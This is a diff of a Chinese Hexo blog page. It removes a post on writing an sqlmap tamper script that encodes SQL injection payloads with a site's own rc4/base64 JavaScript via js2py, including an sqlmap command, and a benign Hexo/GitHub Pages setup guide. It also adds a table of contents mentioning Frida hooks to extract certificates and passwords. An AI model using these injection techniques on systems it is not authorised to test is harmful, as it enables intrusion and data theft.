-<li>sqlmap中的模块，用于自定义编码payload绕过防护设备</li>
-<li>本文使用tamper并不是为了绕过防护设备，而是服务端只接收编码后的数据，对于未编码的数据不会接收</li>
-</ul>
-</li>
-<li>查找加密算法，姿势很多，能找到就行，本次环境为rc4+base64+url编码</li>
-<li>js2py库，用于使用python调用js</li>
-</ul>
-<h2 id="编写tamper"><a href="#编写tamper" class="headerlink" title="编写tamper"></a>编写tamper</h2><ol>
-<li>需要调用外部js，即获取到的js加密代码</li>
-</ol>
-<p><img src="https://s2.loli.net/2022/03/31/r8EdeJgCZKm7fSG.png"></p>
-<ol start="2">
-<li><p>js2py库，用于调用js</p>
-<p>​    这里遇到了一些问题，开始使用的方法是<code>eval_js()</code>，但是该方法只能调用单函数js文件，遇到多函数的js文件会调用最后一个函数</p>
-<p>​    <code>EvalJs()</code>，可以执行多函数js代码，例如：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">with open(&#x27;./get_key.js&#x27;) as fp:</span><br><span class="line">20     js = fp.read()</span><br><span class="line">21     # ctx2 = execjs.compile(js)</span><br><span class="line">22     context = js2py.EvalJs()</span><br><span class="line">23     context.execute(js)</span><br><span class="line">24     vl5x=context.getKey(cookie)		//getKey是get_key.js中的方法，如果要调用其他方法，例如context.main即调用main方法</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>payload处理</p>
-</li>
-</ol>
-<p>​            存在注入的参数要求必须有一个正确的可查到的的参数值，但是这个值也需要编码，放在数据包里面是肯定的不行的，因为包里面的数据不会通过tamper进行处理，所以只能通过tamper把payload进行处理，直接赋值个payload一个固定的值，并且一同调用js进行加密</p>
-<p><img src="https://s2.loli.net/2022/03/31/1mkMIbg3NzKjWqV.png"></p>
-<ol start="4">
-<li>到这里思路基本理清楚了，原参数–&gt;调用tamper–&gt;payload加密–&gt;sqlmap测试，具体代码如下：</li>
-</ol>
-<p><img src="https://s2.loli.net/2022/03/31/zkaPcuvxi41nhw2.png"></p>
-<h2 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h2><p><code>sqlmap -r .\11.txt -p &quot;xxx&quot; --tamper=test.py --dbms=mssql --force-ssl --proxy=http://127.0.0.1:8080</code></p>
-<p><img src="https://s2.loli.net/2022/03/31/HhA1W5ZO7BxiDeM.png"></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://msfisgood.github.io/2022/03/18/Hexo&Gitpage%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.jpg">
-      <meta itemprop="name" content="Y1Shui">
-      <meta itemprop="description" content="奋力前行">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Y1Shui's blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/03/18/Hexo&Gitpage%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/" class="post-title-link" itemprop="url">Hexo&Gitpage搭建记录</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2022-03-18 15:43:58" itemprop="dateCreated datePublished" datetime="2022-03-18T15:43:58+08:00">2022-03-18</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-04-01 14:52:40" itemprop="dateModified" datetime="2022-04-01T14:52:40+08:00">2022-04-01</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E9%9A%8F%E7%AC%94/" itemprop="url" rel="index"><span itemprop="name">随笔</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-file-word-o"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>1.2k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-clock-o"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>1 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><ul>
-<li><p>Git v2.33.0</p>
-</li>
-<li><p>Windows10 21H2</p>
-</li>
-<li><p>Node v16.14.1</p>
-</li>
-<li><p>SSH</p>
-</li>
-</ul>
-<h2 id="搭建流程"><a href="#搭建流程" class="headerlink" title="搭建流程"></a>搭建流程</h2><h3 id="配置ssh密钥"><a href="#配置ssh密钥" class="headerlink" title="配置ssh密钥"></a>配置ssh密钥</h3><ul>
-<li>全局配置本地git账户</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#对应github邮箱和用户名</span><br><span class="line">git config --global user.name &quot;用户名&quot;</span><br><span class="line">git config --global user.email &quot;邮箱地址&quot;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>生成ssh key</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#默认生成路径在C:\Users\用户名\.ssh目录下</span><br><span class="line">ssh-keygen -t rsa -C &quot;邮箱地址&quot;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>查看公钥内容，先在github添加生成的公钥</li>
-</ul>
-<p><img src="https://s2.loli.net/2022/03/17/hCuK1eJrQzsPS3l.png" alt="image.png"></p>
-<ul>
-<li>然后添加到本地信任列表，顺序不能反，否则会提示权限错误</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -T git@github.com </span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>出现 <strong>Hi xxx! You’ve successfully authenticated, but GitHub does not provide shell access</strong> 即为配置成功</li>
-</ul>
-<h3 id="新建github仓库"><a href="#新建github仓库" class="headerlink" title="新建github仓库"></a>新建github仓库</h3><ul>
-<li>新建名为<strong>用户名.github.io</strong>的仓库，如下，该页面会自动认为是gitpage仓库，过几分钟后访问用户名.github.io即可访问页面内容</li>
-</ul>
-<p><img src="https://s2.loli.net/2022/03/17/TmKIPGQkp4jZxBi.png" alt="image.png"></p>
-<h3 id="下载和部署hexo"><a href="#下载和部署hexo" class="headerlink" title="下载和部署hexo"></a>下载和部署hexo</h3><ul>
-<li>下载cnpm，国内速度较快</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g cnpm --registry=https://registry.npm.taobao.org</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>初始化hexo</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cnpm install -g hexo-cli#下载hexo</span><br><span class="line">hexo init Blog			#初始化hexo 新建Blog文件夹</span><br><span class="line">cd Blog</span><br><span class="line">cnpm install			#进入文件夹安装依赖</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><p>配置Next主题，<a target="_blank" rel="noopener" href="https://github.com/theme-next/hexo-theme-next">下载主题</a>，解压到Blog的themes文件夹，在解压好的Next文件夹使用cnpm install安装依赖</p>
-</li>
-<li><p>在Blog目录下_config.yml中的theme修改为next</p>
-</li>
-</ul>
-<p><img src="https://s2.loli.net/2022/03/17/KGn3ZldABYkcJEX.png" alt="image.png"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo clean					#清除缓存，尤其是在更换主题后</span><br><span class="line">hexo g						#生成静态文件</span><br><span class="line">hexo d						#部署网站</span><br></pre></td></tr></table></figure>
-
-
-
-<ul>
-<li>在Blog文件夹启动hexo服务，访问本地4000端口即可访问，这是已经配置好Next主题的页面</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo s</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://s2.loli.net/2022/03/17/ZGl43FAfRmMj8og.png" alt="image.png"></p>
-<h3 id="部署到github"><a href="#部署到github" class="headerlink" title="部署到github"></a>部署到github</h3><ul>
-<li>修改Blog下配置文件，格式如下：</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo:</span><br><span class="line">    github: git@github.com:msfisgood/msfisgood.github.io.git,master</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>安装部署插件</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cnpm install hexo-deployer-git --save</span><br><span class="line">hexo g -d 								#部署上传</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>修改git仓库分支，运行完上一步还需要修改分支，hexo的配置为master分支，仓库默认为main分支，需要在仓库设置-&gt;页面中修改分支为master</li>
-</ul>
-<p><img src="https://s2.loli.net/2022/03/17/TvpdI6wfGuFSAnl.png" alt="image.png"></p>
-<ul>
-<li>过几分钟，访问<a href="https://msfisgood.github.io/%E5%B0%B1%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%88%B0%E9%A1%B5%E9%9D%A2%E4%BA%86">https://msfisgood.github.io/就可以看到页面了</a></li>
-</ul>
-<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><ul>
-<li>后续会继续整理一些hexo技巧和美化方面的内容</li>
-</ul>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-
   
 
 
@@ -968,6 +422,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%8F%90%E5%89%8D%E5%A1%AB%E5%9D%91"><span class="nav-number">2.</span> <span class="nav-text">提前填坑</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%83%E4%B9%A0"><span class="nav-number">2.1.</span> <span class="nav-text">练习</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF"><span class="nav-number">3.</span> <span class="nav-text">应用场景</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Frida-hook-%E8%8E%B7%E5%8F%96%E5%8F%8C%E5%90%91%E8%AE%A4%E8%AF%81%E8%AF%81%E4%B9%A6%E5%92%8C%E5%AF%86%E7%A0%81"><span class="nav-number">3.1.</span> <span class="nav-text">Frida hook 获取双向认证证书和密码</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">4.</span> <span class="nav-text">总结</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%9B%B8%E5%85%B3%E9%93%BE%E6%8E%A5"><span class="nav-number">5.</span> <span class="nav-text">相关链接</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
